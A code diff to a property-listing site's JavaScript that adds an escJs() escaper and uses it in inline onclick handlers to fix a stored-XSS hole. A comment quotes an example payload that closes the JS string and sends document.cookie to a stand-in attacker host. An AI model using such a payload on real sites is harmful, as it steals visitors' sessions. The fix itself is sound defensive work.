@@ -1003,6 +1003,38 @@ function esc(str){
   return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
 
+// escJs(s) -- for a value interpolated into a JS string literal that lives
+// inside an HTML event attribute, e.g. onclick="ptContactClick({unit:'NAME'})".
+//
+// esc() is the WRONG escaper in that position and was a real stored-XSS vector
+// (audit 2026-08-17). The HTML parser decodes entities BEFORE the JS parser
+// ever sees the attribute, so esc()'s &#39; turns back into a live apostrophe
+// and closes the JS string. A unit-type name of
+//   ');document.location='https://attacker/'+document.cookie;//
+// executed for every visitor of that listing. Listing and unit-type prose is
+// not hand-typed-only: it flows in from Smart Import / the Facebook adapter /
+// AI generation, so an outsider can influence it.
+//
+// Escapes for BOTH parsers in the order they run: the JS layer first
+// (backslash, quote, line terminators -- nothing can close the literal or
+// start a statement), then the HTML layer ('&' first, so no attacker-written
+// entity can decode into a quote afterwards, then the attribute delimiter and
+// angle brackets). The backslash-quote from step 1 is intentionally left
+// literal: the attribute is delimited by ", so a bare ' is inert to the HTML
+// parser and reaches the JS parser correctly escaped. Covered by
+// xss-inline-handlers.test.js.
+function escJs(str){
+  if(str==null)return '';
+  return String(str)
+    .replace(/\\/g,'\\\\')
+    .replace(/'/g,"\\'")
+    .replace(/\r/g,'\\r').replace(/\n/g,'\\n')
+    .replace(/\u2028/g,'\\u2028').replace(/\u2029/g,'\\u2029')
+    .replace(/&/g,'&amp;')
+    .replace(/"/g,'&quot;')
+    .replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
 // Fills {{PLACEHOLDER}} tokens in a template string — the one small piece
 // of i18n infrastructure this file didn't already have. Word order is
 // free to differ per language (see WA_MESSAGE_TEMPLATES below); everything
@@ -1923,12 +1955,12 @@ function buildAvailableUnitsSection(property, lang, L, waMessageText, cleanPhone
       // itself; adding data-track too would double-post (see its header
       // comment in components.js).
       ctaHtml='<a href="'+esc(waUnitUrl)+'" target="_blank" rel="noopener noreferrer" class="unit-cta" '+
-        'onclick="event.stopPropagation();ptContactClick({channel:\'whatsapp\',listingId:\''+esc(property.id||'')+'\',partyId:\''+esc(property.managed_by_party_id||'')+'\',contactId:\''+esc((property.contacts&&property.contacts.id)||'')+'\',trackId:\'unit-inquire-whatsapp\',trackLabel:\'Inquire unit\',trackMeta:{unit:\''+esc(unitName)+'\'}})">'+
+        'onclick="event.stopPropagation();ptContactClick({channel:\'whatsapp\',listingId:\''+escJs(property.id||'')+'\',partyId:\''+escJs(property.managed_by_party_id||'')+'\',contactId:\''+escJs((property.contacts&&property.contacts.id)||'')+'\',trackId:\'unit-inquire-whatsapp\',trackLabel:\'Inquire unit\',trackMeta:{unit:\''+escJs(unitName)+'\'}})">'+
         esc(L.unitInquire[lang])+'</a>';
     }
 
     var isSelected = u.id && u.id===selectedUnitTypeId;
-    var selectJs="selectUnitType('"+esc(u.id||'')+"')";
+    var selectJs="selectUnitType('"+escJs(u.id||'')+"')";
     // The whole card is clickable (Booking.com-style room selection) —
     // selecting swaps the hero gallery/price/specs/availability/WhatsApp
     // CTA above to this unit's own values; see selectUnitType() and the
@@ -2195,7 +2227,7 @@ function buildMockupLayout(){
       '<div class="viewing-unit-banner">'+
       '<span class="viewing-unit-label">'+esc(L.viewingUnit[lang])+': <strong>'+esc(selUnitName)+'</strong></span>'+
       '<span class="viewing-unit-status unit-status-'+esc(selectedUnit.availability.status)+'">'+esc(selAvailText)+(selInvText?' · '+esc(selInvText):'')+'</span>'+
-      '<button type="button" class="viewing-unit-reset" onclick="selectUnitType(\''+esc(selectedUnitTypeId)+'\')">'+esc(L.showOverview[lang])+'</button>'+
+      '<button type="button" class="viewing-unit-reset" onclick="selectUnitType(\''+escJs(selectedUnitTypeId)+'\')">'+esc(L.showOverview[lang])+'</button>'+
       '</div>'
     );
   }
@@ -2394,7 +2426,7 @@ function buildMockupLayout(){
   // No data-track on either button below -- ptContactClick() posts
   // ui_events itself (see its header comment in components.js); this is a
   // real property inquiry, so recordLead stays at its true default.
-  var callBtn=(contact&&contact.phone)?'<a href="tel:'+esc(contact.phone)+'" class="btn-primary btn-call" onclick="ptContactClick({channel:\'call\',listingId:\''+esc(data.id||'')+'\',partyId:\''+esc(data.managed_by_party_id||'')+'\',contactId:\''+esc(contact.id||'')+'\',trackId:\'contact-phone\',trackLabel:\'Call\'})"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.15 10.5 19.79 19.79 0 0 1 1.07 2.18 2 2 0 0 1 3.05 0h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 7.91a16 16 0 0 0 6.06 6.06l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg><span class="lo-i">'+L.call.lo+'</span><span class="en-i">'+L.call.en+'</span><span class="zh-i">'+L.call.zh+'</span></a>':'';
+  var callBtn=(contact&&contact.phone)?'<a href="tel:'+esc(contact.phone)+'" class="btn-primary btn-call" onclick="ptContactClick({channel:\'call\',listingId:\''+escJs(data.id||'')+'\',partyId:\''+escJs(data.managed_by_party_id||'')+'\',contactId:\''+escJs(contact.id||'')+'\',trackId:\'contact-phone\',trackLabel:\'Call\'})"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.15 10.5 19.79 19.79 0 0 1 1.07 2.18 2 2 0 0 1 3.05 0h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 7.91a16 16 0 0 0 6.06 6.06l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg><span class="lo-i">'+L.call.lo+'</span><span class="en-i">'+L.call.en+'</span><span class="zh-i">'+L.call.zh+'</span></a>':'';
   var contactHtml=(
     '<div class="agent-band" id="agent-band-anchor">'+
     '<div><p class="agent-presented"><span class="lo-i">'+roleLabel.lo+'</span><span class="en-i">'+roleLabel.en+'</span><span class="zh-i">'+roleLabel.zh+'</span></p>'+
@@ -2402,7 +2434,7 @@ function buildMockupLayout(){
     '<div><div class="agent-name-en">'+esc((contact&&contact.name)||roleLabel.en)+'</div></div>'+
     '</div></div>'+
     '<div class="agent-ctas">'+
-    '<a href="'+esc(waUrl)+'" target="_blank" rel="noopener noreferrer" class="btn-primary btn-wa" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+esc(propertyContext&&propertyContext.id||'')+'\',partyId:\''+esc(propertyContext&&propertyContext.managed_by_party_id||'')+'\',contactId:\''+esc(propertyContext&&propertyContext.contacts&&propertyContext.contacts.id||'')+'\',trackId:\'contact-whatsapp\',trackLabel:\'WhatsApp\'})">'+WA_SVG+'<span>'+L.wa[lang]+'</span></a>'+
+    '<a href="'+esc(waUrl)+'" target="_blank" rel="noopener noreferrer" class="btn-primary btn-wa" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+escJs(propertyContext&&propertyContext.id||'')+'\',partyId:\''+escJs(propertyContext&&propertyContext.managed_by_party_id||'')+'\',contactId:\''+escJs(propertyContext&&propertyContext.contacts&&propertyContext.contacts.id||'')+'\',trackId:\'contact-whatsapp\',trackLabel:\'WhatsApp\'})">'+WA_SVG+'<span>'+L.wa[lang]+'</span></a>'+
     callBtn+
     '</div></div>'
   );
@@ -2448,7 +2480,7 @@ function buildMockupLayout(){
         // instead of silently omitting a call.
         var waStatusMsg=encodeURIComponent(statusCta.label+' — '+(data.title_en||''));
         var waStatusUrl=cleanPhone?'https://wa.me/'+cleanPhone+'?text='+waStatusMsg:'#';
-        statusCtaHtml='<a href="'+esc(waStatusUrl)+'" target="_blank" rel="noopener noreferrer" class="btn-primary btn-wa" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+esc(data.id||'')+'\',partyId:\''+esc(data.managed_by_party_id||'')+'\',recordLead:false,trackId:\'contact-whatsapp-status-cta\',trackLabel:\''+esc(statusCta.action)+'\'})">'+WA_SVG+'<span>'+esc(statusCta.label)+'</span></a>';
+        statusCtaHtml='<a href="'+esc(waStatusUrl)+'" target="_blank" rel="noopener noreferrer" class="btn-primary btn-wa" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+escJs(data.id||'')+'\',partyId:\''+escJs(data.managed_by_party_id||'')+'\',recordLead:false,trackId:\'contact-whatsapp-status-cta\',trackLabel:\''+escJs(statusCta.action)+'\'})">'+WA_SVG+'<span>'+esc(statusCta.label)+'</span></a>';
       }
       contactHtml='<div class="agent-band" id="agent-band-anchor"><div class="agent-ctas" style="width:100%;">'+statusCtaHtml+'</div></div>';
       agentProfileHtml='';
@@ -2822,9 +2854,9 @@ function buildMockupLayout(){
           ? '<a href="#similar-section" class="mcta-btn" data-track="mcta-find-similar" data-track-type="cta" data-track-label="Find Similar">'+esc(statusCta.label)+'</a>'
           : (function(){
               var mWaStatusUrl=cleanPhone?('https://wa.me/'+cleanPhone+'?text='+encodeURIComponent(statusCta.label+' — '+(data.title_en||''))):'#';
-              return '<a href="'+esc(mWaStatusUrl)+'" target="_blank" rel="noopener noreferrer" class="mcta-btn" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+esc(data.id||'')+'\',partyId:\''+esc(data.managed_by_party_id||'')+'\',recordLead:false,trackId:\'mcta-whatsapp-status\',trackLabel:\''+esc(statusCta.action)+'\'})">'+WA_SVG+'<span>'+esc(statusCta.label)+'</span></a>';
+              return '<a href="'+esc(mWaStatusUrl)+'" target="_blank" rel="noopener noreferrer" class="mcta-btn" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+escJs(data.id||'')+'\',partyId:\''+escJs(data.managed_by_party_id||'')+'\',recordLead:false,trackId:\'mcta-whatsapp-status\',trackLabel:\''+escJs(statusCta.action)+'\'})">'+WA_SVG+'<span>'+esc(statusCta.label)+'</span></a>';
             })())
-      : '<a href="'+esc(waUrl)+'" target="_blank" rel="noopener noreferrer" class="mcta-btn" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+esc(propertyContext&&propertyContext.id||'')+'\',partyId:\''+esc(propertyContext&&propertyContext.managed_by_party_id||'')+'\',contactId:\''+esc(propertyContext&&propertyContext.contacts&&propertyContext.contacts.id||'')+'\',trackId:\'mcta-whatsapp\',trackLabel:\'WhatsApp\'})">'+WA_SVG+'<span>'+L.wa[lang]+'</span></a>';
+      : '<a href="'+esc(waUrl)+'" target="_blank" rel="noopener noreferrer" class="mcta-btn" onclick="ptContactClick({channel:\'whatsapp\',listingId:\''+escJs(propertyContext&&propertyContext.id||'')+'\',partyId:\''+escJs(propertyContext&&propertyContext.managed_by_party_id||'')+'\',contactId:\''+escJs(propertyContext&&propertyContext.contacts&&propertyContext.contacts.id||'')+'\',trackId:\'mcta-whatsapp\',trackLabel:\'WhatsApp\'})">'+WA_SVG+'<span>'+L.wa[lang]+'</span></a>';
     mCtaBar.innerHTML=(
       '<div class="mcta-inner">'+
       '<div class="mcta-price-wrap"><span class="mcta-price-label">'+esc(typeBadgeText)+'</span>'+mPriceHtml+'</div>'+
